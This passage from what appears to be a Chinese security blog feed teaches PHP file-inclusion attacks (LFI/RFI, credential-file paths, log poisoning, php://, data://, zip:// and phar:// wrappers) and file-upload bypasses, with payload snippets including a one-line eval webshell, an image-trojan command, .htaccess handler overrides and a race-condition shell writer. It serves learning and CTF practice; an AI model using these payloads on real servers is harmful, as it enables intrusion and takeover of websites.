文件包含函数</h2><ul><li>require():找不到被包含的文件会产生<strong>致命错误</strong>，并停止脚本运行</li><li>include():找不到被包含的文件只会产生<strong>警告</strong>，脚本继续执行</li><li>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li><li>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li></ul><p>注：PHP文件包含漏洞在利用时无视后缀名，任何扩展名的文件都可以被PHP解析器解析。</p><h2 id="利用条件">1.3 利用条件</h2><ul><li>include等函数通过动态执行变量的方式引入需要包含的文件</li><li>用户能控制该动态变量</li></ul><h1 id="php文件包含漏洞分类">2. PHP文件包含漏洞分类</h1><ul><li>文件包含漏洞可以分为LFI（LocalFilelnclusion，本地文件包含）和RFI（Remote Filelnclusion，远程文件包含）两种。而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_url_include。如果开启就有可能包含远程文件。</li><li>远程文件包含需要php.ini中alow_url_include=on，allow_url_fopen=On。在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</li></ul><h2 id="本地文件包含漏洞lfi">2.1 本地文件包含漏洞(LFI)</h2><p><strong>定义</strong>：本地包含是包含目标服务器本地的文件，可以包含同目录下的文件：?file=test.txt；也可以进行目录遍历来读取文件：?file=./…/…/test.txt。</p><p><strong>读取方式：</strong></p><ul><li>绝对路径</li><li>相对路径：./表示当前目录，…/表示上一级目录</li></ul><p><strong>利用目录结构构造payload</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>file = _GET[‘file’];      <span class="hljs-comment">// “../../etc/passwd\0”</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exisits</span>(‘/home/wwwrun/’.<span class="hljs-variable">$file</span>.’.php’)) &#123;<br>  <span class="hljs-comment">//file_exists will return true as the file/home/wwwrun/../../etc/passwd exists  </span><br>  Include‘/home/wwwrun/’.<span class="hljs-variable">$file</span>.’.php’;<br>  <span class="hljs-comment">// the file /etc/passwd will be included</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="远程文件包含漏洞rfi">2.2 远程文件包含漏洞(RFI)</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)。</p><h1 id="php文件包含漏洞利用">3. PHP文件包含漏洞利用</h1><h2 id="读取敏感文件信息">3.1 读取敏感文件信息</h2><p>利用文件包含可以获取很多敏感信息，包含不存在的文件可能可以获取Web服务器、Web根目录、网站路径以及服务器的操作系统信息，根据Web服务器和Web根目录可以获取Apache的配置文件信息和日志文件信息，同时在知道服务器的操作系统后，也可以包含一些操作系统的敏感文件获取相关信息。利用文件包含获取敏感文件就是需要尽可能多的收集敏感文件的路径。</p><p>Windows系统:</p><ul><li><code>C:\boot.ini</code> //查看系统版本</li><li><code>C:\windows\system32\inetsrv\MetaBase.xml</code>//IIS配置文件</li><li><code>C:\windows\repair\sam</code>//存储Windows系统初次安装的密码</li><li><code>C:\ProgramFiles\mysql\my.ini</code> //MySQL配置信息</li><li><code>C:\ProgramFiles\mysql\data\mysql\user.MYD</code> //MySQLroot密码</li><li><code>C:\windows\php.ini</code> //php配置信息</li></ul><p>Linux/Unix系统:</p><ul><li><code>/etc/password</code> //账户信息</li><li><code>/etc/shadow</code> //账户密码信息</li><li><code>/usr/local/app/apache2/conf/httpd.conf</code>//Apache2配置文件</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhost.conf</code>//虚拟网站配置</li><li><code>/usr/local/app/php5/lib/php.ini</code> //PHP配置文件</li><li><code>/etc/httpd/conf/httpd.conf</code> //Apache配置文件</li><li><code>/etc/my.conf</code> //mysql配置文件</li></ul><h2 id="本地包含配合文件上传">3.2 本地包含配合文件上传</h2><p>文件上传漏洞在绕过内容检测的时候，会制作图片马上传，但是图片马在上传之后，又不能解析。如果网站同时存在文件包含漏洞，利用文件包含无视后缀名，只要被包含的文件内容符合PHP语法规范，任何扩展名都可以被PHP解析的特点来解析上传的图片马。制作图片马的方式有很多，常见的有两种：</p><ul><li>在图片后写入脚本代码</li><li>在cmd中使用命令<code>copy 1.jpg/b+1.php/a 2.jpg</code></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">参数<span class="hljs-regexp">/b指定以二进制格式复制、合并文件，用于图像类/</span>声音类文件<br>参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件<br></code></pre></td></tr></table></figure><h2 id="远程包含webshell">3.3 远程包含Webshell</h2><ul><li>本地包含只能包含目标服务器本地已有的文件，若目标服务器本地不存在木马文件，则无法利用。因此可以借助远程文件包含漏洞，在操作机本地搭建Web服务器，远程包含木马文件Getshell。</li><li>利用方法：在无其他漏洞，只有文件包含漏洞，且目标服务器本地无shell文件可利用，又可以远程文件包含时，可以在攻击机本地新建一个一句话木马文件（比如：shell.txt，不要以.php的文件存在，因为php文件在操作机本地会被解析），然后远程包含攻击机本地新建的木马文件，从而Getshell。</li></ul><h2 id="包含apache日志文件">3.4 包含Apache日志文件</h2><ul><li><p>Apache两个日志文件:<code>access.log</code>、<code>error.log</code>。</p></li><li><p>找到Apache路径，利用包含漏洞包含日志文件获取Webshell。</p></li><li><p>利用方法：当访问不存在的资源时，apache日志同样会记录。访问:<code>127.0.0.1/include/?&lt;?php phpinfo();?&gt;</code>，再包含access.log.</p></li></ul><h2 id="包含ssh日志文件">3.5 包含SSH日志文件</h2><p>把用户名写成"phpinfo"，ssh的登陆日志就会把此次的登陆行为记录到日志中.实例：<code>ssh '&lt;?php_phpinfo();?&gt;'@192.168.136.143</code></p><h2 id="包含session文件">3.6 包含session文件</h2><p>Session简介:cookie存在客户端，Session存在服务端，Cookie一般用来保存用户的账户密码，Session—般用来跟踪会话。利用场景:一般存在登陆点位置注册用户.</p><h1 id="php封装伪协议">4 PHP封装伪协议</h1><p>PHP 有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exist()和filesize()的文件系统函数所提供的功能类似。</p><table><thead><tr class="header"><th>名称</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>file://</td><td>访问本地文件系统</td></tr><tr class="even"><td>http://</td><td>访问HTTP(s)网址</td></tr><tr class="odd"><td>ftp://</td><td>访问FTP(s)URLs</td></tr><tr class="even"><td>php://</td><td>访问各个输入/输出流</td></tr><tr class="odd"><td>zlib://</td><td>压缩流</td></tr><tr class="even"><td>data://</td><td>数据</td></tr><tr class="odd"><td>phar://</td><td>PHP归档</td></tr></tbody></table><h2 id="phpfilter">4.1 php://filter</h2><p><strong>用途</strong>：用于读取源码。读取源代码并进行编码输出，不然会直接当作php代码执行就看不到源代码内容。</p><h3 id="字符串过滤器">4.1.1 字符串过滤器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/string.rot13/resource=flag.php //读出以后利用ROT13解码即可</span><br> <br>php:<span class="hljs-comment">//filter/string.toupper/resource=flag.php //转大写</span><br> <br>php:<span class="hljs-comment">//filter/string.tolower/resource=flag.php //转小写</span><br> <br>php:<span class="hljs-comment">//filter/string.strip_tags/resource=flag.php //php标签里所有东西都会被去除，html只有标签会被去除，里面的文字不会删除</span><br></code></pre></td></tr></table></figure><h3 id="转换过滤器">4.1.2 转换过滤器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># convert.base64-encode &amp; convert.base64-decode</span><br><span class="hljs-comment">## /read=convert.base64-encode/ 表示读取内容经过base64 编码</span><br><span class="hljs-comment">## resource=index.php 表示目标文件为index.php</span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br>php:<span class="hljs-comment">//filter/convert.base64-encode/resource=index.php</span><br><br><span class="hljs-comment"># convert.quoted-printable-encode &amp; convert.quoted-printable-decode</span><br>php:<span class="hljs-comment">//filter/convert.quoted-printable-encode/resource=index.php</span><br><br><span class="hljs-comment"># convert.iconv.*</span><br><span class="hljs-comment">## 这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。</span><br><span class="hljs-comment">## 可以结合burp进行爆破</span><br>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; <br>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;<br>php:<span class="hljs-comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><code>convert.iconv.*</code>可用编码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br><span class="hljs-attribute">UTF7</span>-IMAP<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br><span class="hljs-attribute">ASCII</span>*<br></code></pre></td></tr></table></figure><h3 id="压缩过滤器">4.1.3 压缩过滤器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/zlib.deflate|zlib.inflate/resource=flag.php        //zlib.deflate（压缩）｜zlib.inflate（解压）</span><br><span class="hljs-keyword">or</span><br>php:<span class="hljs-comment">//filter/bzip2.compress|bzip2.decompress/resource=flag.php   //bzip2.compress（压缩）|bzip2.decompress（解压）</span><br></code></pre></td></tr></table></figure><h2 id="phpinput">4.2 php://input</h2><p><strong>用途：</strong>可以访问请求的原始数据的只读流,在POST请求中访问POST的data部分，在<code>enctype=multipart/form-data</code>时put://input无效。</p><p><strong>利用：</strong>当传入的参数作为文件名打开时，可以将参数设为php://input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p><h2 id="data">4.3 data://</h2><p><strong>用途：</strong>类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p><p><strong>利用：</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">//实例</span><br><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="language-xml">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></code></pre></td></tr></table></figure><h2 id="zip">4.4 zip://</h2><p>利用zip流，先将要执行的PHP代码写好，文件名为test.txt，将test.txt进行zip压缩，压缩文件名为test.zip，上传文件绕过上传检测（若不能直接上传zip文件，便将test.zip重命名为test.jpg后再上传），再进行包含解析。使用zip协议需要指定绝对路径，使用相对路径会包含失败，同时将#编码为%23。</p><p>实例：</p><p><code>?page=zip://C:/Users/40454/Desktop/test.zip%23test.txt</code></p><p><code>?page=zip://C:/Users/40454/Desktop/test.jpg%23test.txt</code></p><h2 id="phar">4.5 phar://</h2><p>先将要执行的PHP代码写好文件名为test.txt，将test.txt进行zip压缩,压缩文件名为test.zip，绕过文件上传的限制，如果可以上传zip文件便直接上传，若不能便将test.zip重命名为test.jpg后再上传。使用phar流绝对路径和相对路径都可以。</p><p>实例：</p><p><code>http://ip/include/include.php?page=phar://C:/server/apache22/htdocs/up/upload/info.zip/info.txt</code></p><p><code>http://ip/include/include.php?page=phar://../up/upload/info.zip/info.txt</code></p><p><code>http://ip/include/include.php?page=phar://../up/upload/info.jpg/info.txt</code></p><h2 id="伪协议用法小结">4.6 伪协议用法小结</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311022117065.png"alt="none" /><figcaption aria-hidden="true">none</figcaption></figure><h1 id="绕过方式">5 绕过方式</h1><ul><li>伪协议大小写<ul><li><code>strstr()</code>函数区分大小写，<code>stristr()</code>函数不区分大小写</li></ul></li><li>PHP短标签</li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://blog.csdn.net/m0_46467017/article/details/126380415">文件包含漏洞全面详解_caker丶的博客-CSDN博客</a></li><li><ahref="https://jiashi19.gitee.io/2023/10/16/ctf-web-php伪协议/">ctf-web-php伪协议- Blog from js19 (gitee.io)</a></li><li><ahref="https://blog.csdn.net/qq_44657899/article/details/109300335">php://filter的各种过滤器-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传与解析</title>
    <link href="/2023/11/11/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/11/11/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞概述">1. 文件上传漏洞概述</h1><h2 id="概述">1.1 概述</h2><ul><li><p>文件上传是现代互联网常见的功能，允许用户上传图片、视频、及其他类型文件，向用户提供的功能越多，Web受攻击的风险就越大。</p></li><li><p>Form表单编码格式：</p><table><thead><tr class="header"><th>值</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>application/x-www-form-urlencoded</td><td>默认。在发送前对所有字符进行编码(将空格转换为“+"符号，特殊字符转换为ASCIIHEX 值)。</td></tr><tr class="even"><td>multipart/form-data</td><td>不对字符编码。当使用有文件上传控件的表单时，该值是必需的。</td></tr><tr class="odd"><td>text/plain</td><td>将空格转换为“+"符号，但不编码符殊字符。</td></tr></tbody></table><ul><li><code>application/x-www-form-urlencoded</code>：表单中的enctype值如果不设置，默认是此值，将表单中的数据变为键值对的形式。如果action为get，则将表单中的数据转换成一个字符串(name1=value1&amp;name2=value2)，然后把这个字符串附加到URL后面，并用?分割；如果action为post，浏览器把form数据封装到httpbody中，然后发送到服务器。</li><li><code>multipart/form-data</code>：专门用来传输特殊类型数据的，比如文件，会将表单中的数据变成二进制数据，这时候如果用request是无法获取到相应表单的值，应通过stream流对象，将传到服务器端的二进制数据解码，从而读取数据。</li><li><code>text/plain</code>：表单以纯文本形式进行编码</li></ul></li><li><p>上传文件时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本文件(包括asp、aspX、php、jsp等)</p></li><li><p>恶意上传行为可能导致网站甚至整个服务器被控制。恶意的脚本文件又被称为WebShell，WebShell具有强大的功能，如查看服务器目录、服务器中文件、执行系统命令等。</p></li><li><p>Webshell：</p><ul><li>我们可以通过<code>GET 、POST 、COOKIE</code>这三种方式向一个网站提交数据，一句话木马用<code>$_GET[' ']、$_POST[' ']、$_COOKIE[' ']、$_REQUEST[' ']</code>接收我们传递的数据，并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令.</li><li>所以看到的经典一句话木马大多都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分.例如：<code>&lt;?php eval(@$_POST['cmd']); ?&gt;</code>，其中<code>eval</code>就是执行命令的函数，<code>$_POST['cmd']</code>就是接收的数据，eval函数把接收的数据当作PHP代码来执行.这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句，这便是一句话木马的强大之处.</li></ul></li></ul><h2 id="成因">1.2 成因</h2><ul><li>Web应用开放了文件上传功能，并且<strong>对上传的文件没有进行足够的限制</strong></li><li>程序开发部署时候，没有考虑到<strong>系统特性</strong>和<strong>过滤不严格</strong></li><li>攻击者通过<strong>Web服务器解析漏洞</strong>绕过限制，导致可以上传任意文件</li></ul><h2 id="利用">1.3 利用</h2><ul><li>Web 服务器要开启文件上传功能，并且上传api(接口）对外“开放”(Web用户可以访问）</li><li>Web用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，Web目录都有执行权限。</li><li>要想完美利用文件上传漏洞，就是上传的文件可以执行，也就是web容器可以解我们上传的脚本，无论脚本以什么样的形式存在。</li></ul><h2 id="危害">1.4 危害</h2><ul><li>文件上传漏洞最直接的威胁就是<strong>上传任意文件</strong>，包括恶意脚本、可执行程序等。</li><li>如果Web服务器所保存上传文件的可写目录具有执行权限，那么就可以直接上传后门文件，导致<strong>网站沦陷</strong>。</li><li>如果攻击者通过其他漏洞进行提权操纵，拿到系统管理权限，那么直接导致<strong>服务器沦陷</strong>。</li><li>同服务器下的其他网站无一幸免，均会被攻击者控制。</li></ul><h2 id="获取上传文件信息">1.5 获取上传文件信息</h2><p>处理文件上传功能时，会利用表单中的文件上传域，定义表单时必须设置enctype="multipart/form-data"参数。在上传文件后，可以使用$_FILES[‘upfile’]访问文件的有关信息。上传文件的相关信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]; <span class="hljs-regexp">//</span>客户端上传文件的原名称，不包含路径<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]; <span class="hljs-regexp">//</span>上传文件的MIME类型  <br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]; <span class="hljs-regexp">//</span>已上传文件在服务器端保存的临时文件名，包含路径<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]; <span class="hljs-regexp">//</span>上传文件出现的错误号，为一个整数<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]; <span class="hljs-regexp">//</span>已上传文件的大小，单位为字节<br></code></pre></td></tr></table></figure><h1 id="文件上传检测与绕过">2. 文件上传检测与绕过</h1><h2 id="客户端检测与绕过">2.1 客户端检测与绕过</h2><h3 id="检测原理">2.1.1 检测原理</h3><p>客户端(Client):或称为用户端(前端），与服务器相对应。由于客户端对于文件上传漏洞的防御是通过JS代码实现的，所以客户端检测与绕过也称为JS检测与绕过。</p><h3 id="绕过方法">2.1.2 绕过方法</h3><ul><li>删除浏览器事件（表单提交时触发的事件）</li><li>利用BurpSuite抓包修改文件后缀名</li><li>伪造上传表单（感觉相对其他两种方法比较麻烦）</li></ul><h2 id="服务端检测与绕过">2.2 服务端检测与绕过</h2><h3 id="检测原理-1">2.2.1 检测原理</h3><ul><li>后缀名检测与绕过</li><li>MIME类型检测与绕过</li><li>文件内容检测与绕过</li><li>00截断检测与绕过</li><li>条件竞争检测与绕过</li></ul><h3 id="后缀名检测与绕过">2.2.2 后缀名检测与绕过</h3><ul><li><p>黑名单--大小写绕过</p></li><li><p>黑名单--名单列表绕过(黑名单之外的后缀名）：有些中间件允许解析其他文件后缀名，如php3、phtml的文件。</p></li><li><p>黑名单--Windows特性：一些特殊的文件名命名方式在Vindows下是不被允许的，利用BurpSuite抓包修改后缀名，绕过验证后的上传文件，windows会自动去掉后面添加的，但要注意Unix/Linux系统没有这个特性。比如：</p><ul><li>末尾的点（.）<code>1.php.</code></li><li>空格（）<code>1.php</code></li><li><code>::$DATA</code> <code>1.php::$DATA</code></li></ul></li><li><p>白名单绕过：需要配合文件包含漏洞或者解析漏洞</p></li><li><p>.htaccess文件攻击：.htaccess文件是Apache服务器中的分布式配置文件(IIS中不存在该文件），该配置文件会覆盖Apache服务器的全局配置，作用于当前目录及其子目录。如果一个Web应用允许上传.htaccess文件，那就意味着攻击者可以更改Apache的配置，这是十分危险。在httpd.conf配置文件中，AlowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件;如果设置为All,那么所有在.htaccess文件里有的指令都将被重写，即允许.htaccess文件覆盖掉Apache的配置。（利用：先上传该配置文件，再上传脚本文件）</p><ul><li><p>匹配文件内容，将内容符合php语法规则的文件当作PHP文件解析：<code>SetHandler application/x-httpd-php</code></p></li><li><p>匹配文件名中的关键字，比如：当文件名[info.php.png]中包含关键字[.php]，并且.htaccess文件内容为<code>AddHandler php5-script .php</code>，info.php.png中的代码会被执行。</p></li><li><p>匹配文件名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;kai&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>结合Apache文件解析机制，从右向左开始解析文件后缀，若后缀名不可识别，则继续判断直到遇到可解析的后缀为止。</p></li></ul><h3 id="mime类型检测与绕过">2.2.3 MIME类型检测与绕过</h3><p>MME(Multipurpose lnternet MailExtensions)是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。常见的MIME类型如下：</p><table><thead><tr class="header"><th>文件扩展名</th><th>MIME-Type</th></tr></thead><tbody><tr class="odd"><td>.js</td><td>application/x-javascript</td></tr><tr class="even"><td>.html</td><td>text/html</td></tr><tr class="odd"><td>.jpg</td><td>image/jpeg</td></tr><tr class="even"><td>.png</td><td>image/png</td></tr><tr class="odd"><td>.pdf</td><td>application/pdf</td></tr></tbody></table><p>在HTTP协议中，使用Content-Type字段表示文件的MIME类型，可抓包进行修改。</p><h3 id="文件内容检测与绕过">2.3.4 文件内容检测与绕过</h3><p>检测原理：</p><ul><li>getimagesize()</li><li>文件幻数检测<ul><li>JPG:FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF:47 49 46 38 39 61(GIF89a）</li><li>PNG:89 50 4E 47</li></ul></li></ul><p>绕过方法：</p><ul><li>在脚本文件开头补充图片对应的头部值（幻数）</li><li>制作图片马（图片马的解析需要配合文件包含漏洞或者解析漏洞），在图片后写入脚本代码：<code>copy 1.jpg/b+1.php/a 2.jpg</code><ul><li>参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件</li><li>参数/a指定以ASCIl格式复制、合并文件，用于txt等文档类文件</li></ul></li></ul><h3 id="截断检测与绕过">2.3.5 00截断检测与绕过</h3><p>检测原理：</p><ul><li><p>截断漏洞出现的核心就是chr(0)，这个字符不为空(Nul)，也不是空字符（"")，更不是空格。当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。</p></li><li><p>由于0x00是字符串的结束标识符，PHP会把0x00后面的所有字符删除。攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。利用00截断绕过需要同时满足两个条件：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. PHP版本必须小于<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">2</span>. php.ini配置文件中的magic_quotes_gpc为<span class="hljs-literal">Off</span>状态（GPC关闭）<br></code></pre></td></tr></table></figure></li></ul><p>绕过方法：</p><ul><li>GET方式：%00</li><li>POST方式：0x00</li></ul><h3 id="条件竞争检测与绕过">2.3.6 条件竞争检测与绕过</h3><p>检测原理：一些网站文件检测逻辑是先允许上传任意文件，然后检查文件内容是否包含可执行脚本，如果包含则删除。</p><p>绕过方法：利用成功上传到删除文件的时间差，上传一个.php文件，在未删除之前立即访问，则会自动生成—个新php文件，新文件不会被删除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常见函数">2.3 常见函数</h2><p><strong>deldot():</strong></p><p>deldot()函数为upload-labs中一个常见的函数，它实际为一个自定义函数.功能：从字符串的尾部开始，从后向前删除点<code>.</code>，直到该字符串的末尾字符不是<code>.</code>为止.</p><p><strong>in_array():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">false</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>功能：用来检查数组中是否存在某个值，如果找到 needle 则返回true，否则返回 false.</p><p><strong>intval():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span> ] )<br></code></pre></td></tr></table></figure><p>功能：通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的integer 数值.</p><p><strong>strrchr():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>): <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>功能：strrchr函数在字符串haystack中查找needle，并将最后一次查找到的needle及其后面的字符串返回.如果没有在该字符串中查找到needle，则返回false.</p><p><strong>strtolower():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$string</span>): <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>功能：将字符串string中的各个英文字符转换为小写并返回</p><p><strong>strrpos():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$start</span> = <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>功能：返回字符<code>$needle</code>最后一次出现的位置</p><p><strong>str_ireplace()</strong></p><figure class="highlight php"><table><tr><td 